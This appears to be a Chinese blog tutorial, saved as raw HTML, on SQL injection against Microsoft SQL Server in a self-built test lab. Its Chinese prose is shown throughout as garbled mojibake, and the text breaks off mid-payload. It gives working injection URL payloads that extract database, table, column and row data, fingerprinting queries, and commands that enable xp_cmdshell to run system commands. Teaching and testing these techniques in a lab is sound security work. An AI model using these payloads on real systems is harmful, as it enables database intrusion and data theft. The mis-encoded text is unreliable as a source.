å¦‚æœä¸¤ä¸ªå¸ƒå°”è¡¨è¾¾å¼éƒ½ä¸ºtrueï¼Œåˆ™ç»“æœä¸ºtrueï¼›å¦‚æœå…¶ä¸­ä¸€ä¸ªè¡¨è¾¾å¼ä¸ºfalseï¼Œåˆ™ç»“æœä¸ºfalse<br><br>ANY å¦‚æœä¸€ç»„çš„æ¯”è¾ƒä¸­ä»»ä½•ä¸€ä¸ªä¸ºtrueï¼Œåˆ™ç»“æœä¸ºtrue<br><br>BETWEEN å¦‚æœæ“ä½œæ•°åœ¨æŸä¸ªèŒƒå›´ä¹‹å†…ï¼Œé‚£ä¹ˆç»“æœä¸ºtrue<br><br>EXISTS  å¦‚æœå­æŸ¥è¯¢ä¸­åŒ…å«äº†ä¸€äº›è¡Œï¼Œé‚£ä¹ˆç»“æœä¸ºtrue<br><br>IN  å¦‚æœæ“ä½œæ•°ç­‰äºè¡¨è¾¾å¼åˆ—è¡¨ä¸­çš„ä¸€ä¸ªï¼Œé‚£ä¹ˆç»“æœä¸ºtrue<br><br>LIKE    å¦‚æœæ“ä½œæ•°ä¸æŸç§æ¨¡å¼ç›¸åŒ¹é…ï¼Œé‚£ä¹ˆç»“æœä¸ºtrue<br><br>NOT å¯¹ä»»ä½•å…¶ä»–å¸ƒå°”è¿ç®—ç¬¦çš„ç»“æœå€¼å–å<br><br>OR  å¦‚æœä¸¤ä¸ªå¸ƒå°”è¡¨è¾¾å¼ä¸­çš„ä»»ä½•ä¸€ä¸ªä¸ºtrueï¼Œé‚£ä¹ˆç»“æœä¸ºtrue<br><br>SOME    å¦‚æœåœ¨ä¸€ç»„æ¯”è¾ƒä¸­ï¼Œæœ‰äº›æ¯”è¾ƒä¸ºtrueï¼Œé‚£ä¹ˆç»“æœä¸ºtrue<br></code></pre></td></tr></table></figure><p><strong>è¯­æ³•å®šä¹‰ç¬¦å·</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt; &gt; å°–æ‹¬å·ï¼Œç”¨äºåˆ†éš”å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ä¸ºè¯­æ³•å…ƒç´ çš„åç§°ï¼ŒSQLè¯­è¨€çš„éç»ˆç»“ç¬¦ã€‚<br><br><br>::= å®šä¹‰æ“ä½œç¬¦ã€‚ç”¨åœ¨ç”Ÿæˆè§„åˆ™ä¸­ï¼Œåˆ†éš”è§„åˆ™å®šä¹‰çš„å…ƒç´ å’Œè§„åˆ™å®šä¹‰ã€‚ è¢«å®šä¹‰çš„å…ƒç´ ä½äºæ“ä½œç¬¦çš„å·¦è¾¹ï¼Œè§„åˆ™å®šä¹‰ä½äºæ“ä½œç¬¦çš„å³è¾¹ã€‚<br><br><br>[ ] æ–¹æ‹¬å·è¡¨ç¤ºè§„åˆ™ä¸­çš„å¯é€‰å…ƒç´ ã€‚æ–¹æ‹¬å·ä¸­çš„è§„åˆ™éƒ¨åˆ†å¯ä»¥æ˜ç¡®æŒ‡å®šä¹Ÿå¯ä»¥çœç•¥ã€‚<br><br><br>&#123; &#125; èŠ±æ‹¬å·èšé›†è§„åˆ™ä¸­çš„å…ƒç´ ã€‚åœ¨èŠ±æ‹¬å·ä¸­çš„è§„åˆ™éƒ¨åˆ†å¿…é¡»æ˜ç¡®æŒ‡å®šã€‚<br><br><br>() æ‹¬å·æ˜¯åˆ†ç»„è¿ç®—ç¬¦<br></code></pre></td></tr></table></figure><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><ol><li>èšåˆå‡½æ•°ï¼š<ul><li><code>SUM()</code>ï¼šè®¡ç®—æŸåˆ—çš„æ€»å’Œã€‚</li><li><code>COUNT()</code>ï¼šè®¡ç®—æŸåˆ—çš„è¡Œæ•°ã€‚</li><li><code>AVG()</code>ï¼šè®¡ç®—æŸåˆ—çš„å¹³å‡å€¼ã€‚</li><li><code>MIN()</code>ï¼šæ‰¾åˆ°æŸåˆ—çš„æœ€å°å€¼ã€‚</li><li><code>MAX()</code>ï¼šæ‰¾åˆ°æŸåˆ—çš„æœ€å¤§å€¼ã€‚</li></ul></li><li>å­—ç¬¦ä¸²å‡½æ•°ï¼š<ul><li><code>LEN()</code>ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</li><li><code>UPPER()</code>ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ã€‚</li><li><code>LOWER()</code>ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ã€‚</li><li><code>SUBSTRING()</code>ï¼šæå–éƒ¨åˆ†å­—ç¬¦ä¸²ã€‚</li><li><code>CONCAT()</code>ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥åœ¨ä¸€èµ·ã€‚</li><li><code>ASCII()</code>:   å°†å­—ç¬¦è½¬æ¢æˆå¯¹åº”çš„ASCIIç </li><li>char():   å°†ASCIIè½¬æ¢æˆå¯¹åº”çš„å­—ç¬¦</li></ul></li><li>æ—¥æœŸå’Œæ—¶é—´å‡½æ•°ï¼š<ul><li><code>GETDATE()</code>ï¼šè¿”å›å½“å‰æ—¥æœŸå’Œæ—¶é—´ã€‚</li><li><code>DATEPART()</code>ï¼šè¿”å›æ—¥æœŸæˆ–æ—¶é—´éƒ¨åˆ†çš„å€¼ï¼ˆå¦‚å¹´ã€æœˆã€æ—¥ã€å°æ—¶ã€åˆ†é’Ÿç­‰ï¼‰ã€‚</li><li><code>DATEDIFF()</code>ï¼šè®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹é—´çš„å·®å€¼ã€‚</li><li><code>DATEADD()</code>ï¼šåœ¨æ—¥æœŸä¸Šæ·»åŠ æˆ–å‡å»æŒ‡å®šçš„æ—¶é—´é—´éš”ã€‚</li></ul></li><li>æ•°å­¦å‡½æ•°ï¼š<ul><li><code>ABS()</code>ï¼šè¿”å›æ•°å€¼çš„ç»å¯¹å€¼ã€‚</li><li><code>ROUND()</code>ï¼šå°†æ•°å€¼å››èˆäº”å…¥åˆ°æŒ‡å®šçš„å°æ•°ä½æ•°ã€‚</li><li><code>FLOOR()</code>ï¼šè¿”å›ä¸å¤§äºæŒ‡å®šæ•°å€¼çš„æœ€å¤§æ•´æ•°ã€‚</li><li><code>CEILING()</code>ï¼šè¿”å›ä¸å°äºæŒ‡å®šæ•°å€¼çš„æœ€å°æ•´æ•°ã€‚</li><li><code>POWER()</code>ï¼šè®¡ç®—ä¸€ä¸ªæ•°çš„æŒ‡å®šæ¬¡å¹‚ã€‚</li></ul></li><li>é€»è¾‘å‡½æ•°ï¼š<ul><li><code>IF()</code> æˆ– <code>IIF()</code>ï¼šæ ¹æ®æ¡ä»¶è¿”å›ä¸åŒçš„å€¼ã€‚</li><li><code>CASE</code> è¡¨è¾¾å¼ï¼šæ ¹æ®æ¡ä»¶é€‰æ‹©ä¸åŒçš„ç»“æœã€‚</li></ul></li></ol><p>mssqlè¿˜æœ‰ä¸€ä¸ªç‰¹æœ‰çš„å‡½æ•°ç”¨æ¥å»¶è¿Ÿä¸€æ®µæ—¶é—´ï¼Œmysqlåˆ™æ˜¯ç”¨sleep</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-- å»¶è¿Ÿ 5 ç§’<br>WAITFOR DELAY &#x27;00:00:05&#x27;<br><br>-- å»¶è¿Ÿ 2.5 ç§’<br>WAITFOR DELAY &#x27;00:00:02.500&#x27;<br></code></pre></td></tr></table></figure><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p><strong>åŸºæœ¬ä¿¡æ¯</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@@version  //æ•°æ®åº“ç‰ˆæœ¬<br>@@servername //ä¸»æœºå<br>user  //å½“å‰æ•°æ®åº“ç”¨æˆ·å<br>db_name()  //å½“å‰æ•°æ®åº“å<br>;select user  //æŸ¥è¯¢æ˜¯å¦æ”¯æŒå¤šè¯­å¥<br>SUSER_SNAME() //å½“å‰ä¼šè¯ç™»å½•çš„ç”¨æˆ·å<br>ORIGINAL_LOGIN()  //è¿”å›æœ€åˆæ‰§è¡Œå½“å‰æ‰¹å¤„ç†æˆ–è§¦å‘å™¨çš„ç™»å½•å<br>current_user()  //å½“å‰æ•°æ®åº“ç”¨æˆ·<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441333.png" alt="image-20240404112105796"></p><p><strong>åˆ¤æ–­æ˜¯å¦ç«™åº“åˆ†ç¦»</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select * from info where id=&#x27;1&#x27;and host_name()=@@servername;--&#x27;<br>//host_name()è¡¨ç¤ºå®¢æˆ·ç«¯ä¸»æœºå<br>//@@servernameè¡¨ç¤ºæœåŠ¡ç«¯ä¸»æœºå<br>//å¦‚æœä¸ºtrueåˆ™è¡¨ç¤ºæ²¡æœ‰åˆ†ç¦»ï¼Œé€šè¿‡æ¯”è¾ƒè¿™ä¸¤ä¸ªå€¼ï¼Œå¯ä»¥ç¡®å®šæŸ¥è¯¢æ­£åœ¨è¿è¡Œçš„æ•°æ®åº“æœåŠ¡å™¨æ˜¯å¦åŒæ—¶åŒ…å«åº”ç”¨ç¨‹åºæœåŠ¡å™¨å’Œæ•°æ®åº“æœåŠ¡å™¨ã€‚<br></code></pre></td></tr></table></figure><p>æˆ–è€…å¯ä»¥é€šè¿‡xp_cmshellæ¥åˆ¤æ–­ï¼Œè¿™é‡Œå…ˆå¼€å¯xp_cmdshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sp_configure &#x27;show advanced options&#x27;, 1;<br>reconfigure;<br>GO<br>sp_configure &#x27;xp_cmdshell&#x27;, 1;<br>RECONFIGURE;<br>GO<br>xp_cmdshell &quot;whoami&quot;;<br>//æˆ–è€… exec xp_cmdshell &quot;whoami&quot;;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441334.png" alt="image-20240404122902796"></p><blockquote><p>xp_cmdshellæ˜¯é»˜è®¤å…³é—­çš„ä¸º0ï¼Œéœ€è¦å…ˆå¼€å¯å®ƒæ‰è¡Œ</p><p>ä½¿ç”¨sp_cocnfigure å¯ä»¥ä¿®æ”¹æœåŠ¡å™¨é…ç½®</p><p><img src="http://cdn.clown2024.cn/202407151441335.png" alt="image-20240404123145991"></p></blockquote><p>æˆ‘ä»¬é€šè¿‡ä½¿ç”¨xp_cmdshellå°±å¯ä»¥åˆ¤æ–­å‡ºå½“å‰ç”¨æˆ·çš„æƒé™ï¼Œæ¯”å¦‚MSSQL2005çš„æƒé™ä¸€èˆ¬æ˜¯system è€Œ2008æ˜¯nt authority\network serviceï¼Œåœ¨ä¸Šå›¾ä¸­ä¹Ÿæœ‰æ˜¾ç¤ºã€‚</p><p><strong>åˆ¤æ–­å½“å‰æ˜¯å¦ä¸ºmssql</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select * from sysobjects;<br>//å› ä¸ºsysobjectsä¸ºMSSQLä¸­ç‹¬æœ‰çš„æ•°æ®è¡¨ï¼Œè¿”å›æ­£å¸¸å³å¯è¡¨ç¤ºä¸ºMSSQL<br>//sysobjectsç›¸å½“äºmaster.sys.objects<br></code></pre></td></tr></table></figure><p><strong>æƒé™åˆ¤æ–­</strong></p><p><code>IS_SRVROLEMEMBER(&#39;role&#39; [, &#39;login&#39;])</code> å‡½æ•°æ˜¯ SQL Server ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥æŒ‡å®šç™»å½•åï¼ˆloginï¼‰æ˜¯å¦å±äºæŒ‡å®šçš„æœåŠ¡å™¨è§’è‰²ï¼ˆroleï¼‰ï¼Œä¸æŒ‡å®šç”¨æˆ·åå°±é»˜è®¤å½“å‰ç™»å½•ç”¨æˆ·åã€‚ç”¨æ¥åˆ¤æ–­æœåŠ¡å™¨è§’è‰²</p><p><img src="http://cdn.clown2024.cn/202407151441336.png" alt="image-20240404142324755"></p><p>ä¸‹é¢æ˜¯ä¸€äº›å›ºå®šè§’è‰²ï¼š</p><table><thead><tr><th align="left">æœåŠ¡å™¨çº§çš„å›ºå®šè§’è‰²</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">sysadmin</td><td align="left">sysadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»ä½•æ´»åŠ¨ã€‚</td></tr><tr><td align="left">serveradmin</td><td align="left">serveradmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥æ›´æ”¹æœåŠ¡å™¨èŒƒå›´çš„é…ç½®é€‰é¡¹å’Œå…³é—­æœåŠ¡å™¨ã€‚</td></tr><tr><td align="left">securityadmin</td><td align="left">securityadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥ç®¡ç†ç™»å½•ååŠå…¶å±æ€§ã€‚ ä»–ä»¬å¯ä»¥ <code>GRANT</code>ã€<code>DENY</code> å’Œ <code>REVOKE</code> æœåŠ¡å™¨çº§æƒé™ã€‚ ä»–ä»¬è¿˜å¯ä»¥ <code>GRANT</code>ã€<code>DENY</code> å’Œ <code>REVOKE</code> æ•°æ®åº“çº§æƒé™ï¼ˆå¦‚æœä»–ä»¬å…·æœ‰æ•°æ®åº“çš„è®¿é—®æƒé™ï¼‰ã€‚ æ­¤å¤–ï¼Œä»–ä»¬è¿˜å¯ä»¥é‡ç½® SQL Server ç™»å½•åçš„å¯†ç ã€‚ é‡è¦è¯´æ˜ï¼š å¦‚æœèƒ½å¤Ÿæˆäºˆå¯¹ æ•°æ®åº“å¼•æ“ çš„è®¿é—®æƒé™å’Œé…ç½®ç”¨æˆ·æƒé™ï¼Œå®‰å…¨ç®¡ç†å‘˜å¯ä»¥åˆ†é…å¤§å¤šæ•°æœåŠ¡å™¨æƒé™ã€‚ securityadmin è§’è‰²åº”è§†ä¸ºä¸ sysadmin è§’è‰²ç­‰æ•ˆã€‚</td></tr><tr><td align="left">processadmin</td><td align="left">processadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥ç»ˆæ­¢åœ¨ SQL Server å®ä¾‹ä¸­è¿è¡Œçš„è¿›ç¨‹ã€‚</td></tr><tr><td align="left">setupadmin</td><td align="left">setupadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥ä½¿ç”¨ Transact-SQL è¯­å¥æ·»åŠ å’Œåˆ é™¤é“¾æ¥æœåŠ¡å™¨ã€‚ ï¼ˆä½¿ç”¨ Management Studio æ—¶éœ€è¦ sysadmin æˆå‘˜èµ„æ ¼ã€‚ï¼‰</td></tr><tr><td align="left">bulkadmin</td><td align="left">bulkadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥è¿è¡Œ <code>BULK INSERT</code> è¯­å¥ã€‚</td></tr><tr><td align="left">diskadmin</td><td align="left">diskadmin å›ºå®šæœåŠ¡å™¨è§’è‰²ç”¨äºç®¡ç†ç£ç›˜æ–‡ä»¶ã€‚</td></tr><tr><td align="left">dbcreator</td><td align="left">dbeator å›ºåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥åˆ›å»ºã€æ›´æ”¹ã€åˆ é™¤å’Œè¿˜åŸä»»ä½•æ•°æ®åº“ã€‚</td></tr><tr><td align="left">puic</td><td align="left">æ¯ä¸ª SQL Server ç™»å½•åéƒ½å±äº public æœåŠ¡å™¨è§’è‰²ã€‚ å¦‚æœæœªå‘æŸä¸ªæœåŠ¡å™¨ä¸»ä½“æˆäºˆæˆ–æ‹’ç»å¯¹æŸä¸ªå®‰å…¨å¯¹è±¡çš„ç‰¹å®šæƒé™ï¼Œè¯¥ç”¨æˆ·å°†ç»§æ‰¿æˆäºˆè¯¥å¯¹è±¡çš„ public è§’è‰²çš„æƒé™ã€‚ åªæœ‰åœ¨å¸Œæœ›æ‰€æœ‰ç”¨æˆ·éƒ½èƒ½ä½¿ç”¨å¯¹è±¡æ—¶ï¼Œæ‰åœ¨å¯¹è±¡ä¸Šåˆ†é… Public æƒé™ã€‚ ä½ æ— æ³•æ›´æ”¹å…·æœ‰ Public è§’è‰²çš„æˆå‘˜èº«ä»½ã€‚ æ³¨æ„plic ä¸å…¶ä»–è§’è‰²çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯é€šè¿‡ public å›ºå®šæœåŠ¡å™¨è§’è‰²æˆäºˆã€æ‹’ç»æˆ–è°ƒç”¨æƒé™ã€‚</td></tr></tbody></table><p>æ•°æ®åº“çº§åˆ«è§’è‰²ä½¿ç”¨<code>IS_MEMBER(&#39;role&#39;)æ¥åˆ¤æ–­</code></p><table><thead><tr><th align="left">å›ºå®šæ•°æ®åº“è§’è‰²å</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">db_owner</td><td align="left">db_owner å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥æ‰§è¡Œæ•°æ®åº“çš„æ‰€æœ‰é…ç½®å’Œç»´æŠ¤æ´»åŠ¨ï¼Œè¿˜å¯ä»¥åˆ é™¤ SQL Serverä¸­çš„æ•°æ®åº“ã€‚ ï¼ˆåœ¨ SQL æ•°æ®åº“ å’Œ SQL æ•°æ®ä»“åº“ä¸­ï¼ŒæŸäº›ç»´æŠ¤æ´»åŠ¨éœ€è¦æœåŠ¡å™¨çº§åˆ«æƒé™ï¼Œå¹¶ä¸”ä¸èƒ½ç”± db_ownersæ‰§è¡Œã€‚ï¼‰</td></tr><tr><td align="left">db_securityadmin</td><td align="left">db_securityadmin å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥ä»…ä¿®æ”¹è‡ªå®šä¹‰è§’è‰²çš„è§’è‰²æˆå‘˜èµ„æ ¼ã€åˆ›å»ºæ— ç™»å½•åçš„ç”¨æˆ·å’Œç®¡ç†æƒé™ã€‚ å‘æ­¤è§’è‰²ä¸­æ·»åŠ ä¸»ä½“å¯èƒ½ä¼šå¯¼è‡´æ„å¤–çš„æƒé™å‡çº§ã€‚</td></tr><tr><td align="left">db_accessadmin</td><td align="left">db_accessadmin å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥ä¸º Windows ç™»å½•åã€Windows ç»„å’Œ SQL Server ç™»å½•åæ·»åŠ æˆ–åˆ é™¤æ•°æ®åº“è®¿é—®æƒé™ã€‚</td></tr><tr><td align="left">db_backupoperator</td><td align="left">db_backupoperator å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥å¤‡ä»½æ•°æ®åº“ã€‚</td></tr><tr><td align="left">db_ddladmin</td><td align="left">db_ddladmin å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥åœ¨æ•°æ®åº“ä¸­è¿è¡Œä»»ä½•æ•°æ®å®šä¹‰è¯­è¨€ (DDL) å‘½ä»¤ã€‚</td></tr><tr><td align="left">db_datawriter</td><td align="left">db_datawriter å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥åœ¨æ‰€æœ‰ç”¨æˆ·è¡¨ä¸­æ·»åŠ ã€åˆ é™¤æˆ–æ›´æ”¹æ•°æ®ã€‚</td></tr><tr><td align="left">db_datareader</td><td align="left">db_datareader å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥ä»æ‰€æœ‰ç”¨æˆ·è¡¨ä¸­è¯»å–æ‰€æœ‰æ•°æ®ã€‚</td></tr><tr><td align="left">db_denydatawriter</td><td align="left">db_denydatawriter å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜ä¸èƒ½æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤æ•°æ®åº“å†…ç”¨æˆ·è¡¨ä¸­çš„ä»»ä½•æ•°æ®ã€‚</td></tr><tr><td align="left">db_denydatareader</td><td align="left">db_denydatareader å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜ä¸èƒ½è¯»å–æ•°æ®åº“å†…ç”¨æˆ·è¡¨ä¸­çš„ä»»ä½•æ•°æ®ã€‚</td></tr></tbody></table><p>è¿”å›ç±»å‹:</p><table><thead><tr><th>è¿”å›å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>0</td><td>login ä¸æ˜¯ role çš„æˆå‘˜ã€‚</td></tr><tr><td>1</td><td>login æ˜¯ role çš„æˆå‘˜ã€‚</td></tr><tr><td>NULL</td><td>role æˆ– login æ— æ•ˆï¼Œæˆ–è€…æ²¡æœ‰æŸ¥çœ‹è§’è‰²æˆå‘˜èº«ä»½çš„æƒé™ã€‚</td></tr></tbody></table><h1 id="mssqlæ³¨å…¥æµç¨‹"><a href="#MSSQLæ³¨å…¥æµç¨‹" class="headerlink" title="MSSQLæ³¨å…¥æµç¨‹"></a>MSSQLæ³¨å…¥æµç¨‹</h1><p>ç”±äºç½‘ä¸Šæ²¡æœ‰ç°æˆé¶åœºéœ€è¦è‡ªå·±æ­ä¸€ä¸ªæµ‹è¯•ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://macchiato.ink/web/web_security/mssql_injection_setup/#0x03-web%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%85">https://macchiato.ink/web/web_security/mssql_injection_setup/#0x03-web%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%85</a></p><blockquote><p>å¼€iisçš„æ—¶å€™è®°å¾—è¦å‹¾é€‰.netæ‰©å±•ä¸ç„¶è§£æä¸äº†</p></blockquote><p>æœ€åæ­å¥½å¤§æ¦‚å°±æ˜¯è¿™æ ·</p><p><img src="http://cdn.clown2024.cn/202407151441337.png" alt="image-20240404151819506"></p><p><strong>æ³¨å…¥æµç¨‹</strong></p><ol><li>è·å–æ•°æ®åº“å</li><li>è·å–æ•°æ®åº“çš„è¡¨å</li><li>è·å–æ•°æ®åº“çš„å­—æ®µå</li><li>è·å–å¯¹åº”çš„æ•°æ®</li></ol><h2 id="ä¸»è¦ç³»ç»Ÿè¡¨"><a href="#ä¸»è¦ç³»ç»Ÿè¡¨" class="headerlink" title="ä¸»è¦ç³»ç»Ÿè¡¨"></a>ä¸»è¦ç³»ç»Ÿè¡¨</h2><ol><li>sysdatabases :è¿™å¼ è¡¨ä¿å­˜åœ¨masteræ•°æ®åº“ä¸­ï¼Œé‡Œè¾¹çš„nameå­—æ®µä¸‹å­˜æ”¾çš„æ˜¯æ‰€æœ‰æ•°æ®åº“çš„åº“åã€‚ </li><li>sysobjectsï¼šè¿™å¼ è¡¨ä¿å­˜çš„æ˜¯æ•°æ®åº“çš„è¡¨çš„ä¿¡æ¯ï¼Œé‡Œè¾¹çš„idå­—æ®µå­˜æ”¾çš„æ˜¯è¡¨çš„idï¼Œnameä¸ºè¡¨åï¼Œxtype å­—æ®µå­˜æ”¾çš„æ˜¯è¡¨çš„ç±»å‹ï¼Œuä»£è¡¨ä¸ºç”¨æˆ·åˆ›å»ºçš„è¡¨ï¼Œsè¡¨ç¤ºè¯¥è¡¨æ˜¯ç³»ç»Ÿè¡¨ã€‚</li><li>syscolumnsï¼šè¿™å¼ è¡¨å­˜æ”¾çš„æ˜¯æ•°æ®åº“ä¸­å­—æ®µçš„ä¿¡æ¯ï¼Œid ä¸ºè¡¨çš„idï¼Œè¯¥idå¯ä»¥é€šè¿‡sysobjectsè·å¾—ã€‚nameä¸ºå­—æ®µåç§°ã€‚</li></ol><h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><h2 id="è·å–æ•°æ®åº“å"><a href="#è·å–æ•°æ®åº“å" class="headerlink" title="è·å–æ•°æ®åº“å"></a>è·å–æ•°æ®åº“å</h2><p><strong>åˆ©ç”¨db_name()æ¥è·å–</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select 1,db_name(),NULL,NULL,NULL<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441338.png" alt="image-20240404154924142"></p><p>è¿˜å¯ä»¥ä½¿å…¶æŠ¥é”™æ¥è·å–åº“å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and db_name()&gt;0<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441339.png" alt="image-20240404155032112"></p><h2 id="çˆ†è¡¨å"><a href="#çˆ†è¡¨å" class="headerlink" title="çˆ†è¡¨å"></a>çˆ†è¡¨å</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;)<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441340.png" alt="image-20240404160254630"></p><h2 id="çˆ†åˆ—å"><a href="#çˆ†åˆ—å" class="headerlink" title="çˆ†åˆ—å"></a>çˆ†åˆ—å</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_messages&#x27;) and name&lt;&gt;&#x27;id&#x27;);--<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441341.png" alt="image-20240404164654710"></p><h2 id="çˆ†æ•°æ®"><a href="#çˆ†æ•°æ®" class="headerlink" title="çˆ†æ•°æ®"></a>çˆ†æ•°æ®</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select top 1 message_id,NULL,NULL,NULL,NULL from fsb_messages<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441342.png" alt="image-20240405004846596"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select%20 message_id,NULL,NULL,NULL,NULL from fsb_messages<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441343.png" alt="image-20240405004940238"></p><blockquote><p>æŠ¥é”™æ³¨å…¥åªèƒ½æŸ¥è¯¢ä¸€ä¸ªä¸€ä¸ªå€¼ï¼Œä½†æ˜¯mssqlæ²¡æœ‰limitè¿™ç§ä¸œè¥¿ï¼Œå°±åªèƒ½ç”¨topåŠ ä¸Šåˆ¤æ–­æ¥éå†æ•°æ®ã€‚</p></blockquote><p>ä½†æ˜¯è¿™é‡Œçš„message_idå’Œæ•°å­—ç±»å‹ä¸€æ ·å°±è¦æ¢å…¶ä»–ç±»å‹æ¥è¿›è¡ŒæŠ¥é”™å›æ˜¾ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹å‘ç°ä¸è¡Œï¼Œåº”è¯¥è¦æ˜¯æŸ¥è¯¢çš„é‚£éƒ¨åˆ†å‡ºé”™æ‰ä¼šæ˜¾ç¤ºå‡ºæ¥</p><p><img src="http://cdn.clown2024.cn/202407151441344.png" alt="image-20240405005556182"></p><p>ä½†æ˜¯å½“è”åˆæŸ¥è¯¢å¯ç”¨åˆçŸ¥é“åˆ—æ•°æ—¶å¯ä»¥ç›´æ¥åƒä¸Šé¢ä¸€æ ·å…¨éƒ¨æŸ¥å‡ºï¼Œå¯ä»¥åˆ©ç”¨order byæ¥åˆ¤æ–­åˆ—æ•°ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151441345.png" alt="image-20240405005134075"></p><p>order by 5ä¸æŠ¥é”™è¯æ˜å°±æœ‰5åˆ—æ•°æ®ã€‚</p><h2 id="æ˜¾å¼è½¬æ¢æŠ¥é”™"><a href="#æ˜¾å¼è½¬æ¢æŠ¥é”™" class="headerlink" title="æ˜¾å¼è½¬æ¢æŠ¥é”™"></a>æ˜¾å¼è½¬æ¢æŠ¥é”™</h2><p>ä¸Šé¢çš„éƒ½æ˜¯éšå¼è½¬æ¢ç±»å‹æ¥æŠ¥é”™è·å¾—ä¿¡æ¯ï¼Œmssqlä¸­è¿˜æœ‰ä¸¤ä¸ªå‡½æ•°ç”¨äºæ˜¾å¼è½¬æ¢</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">CAST</span>( expression <span class="hljs-keyword">AS</span> data_type )<br><br><span class="hljs-keyword">CONVERT</span>(data_type[(length)], expression [, style])<br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ‹¿ä¸€ä¸ªvarcharæ•°æ®æ¥è¿›è¡Œç¤ºä¾‹</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?user_id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,text) <span class="hljs-keyword">from</span> fsb_messages)<br>?user_id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-built_in">cast</span>(text <span class="hljs-keyword">as</span> <span class="hljs-type">int</span>) <span 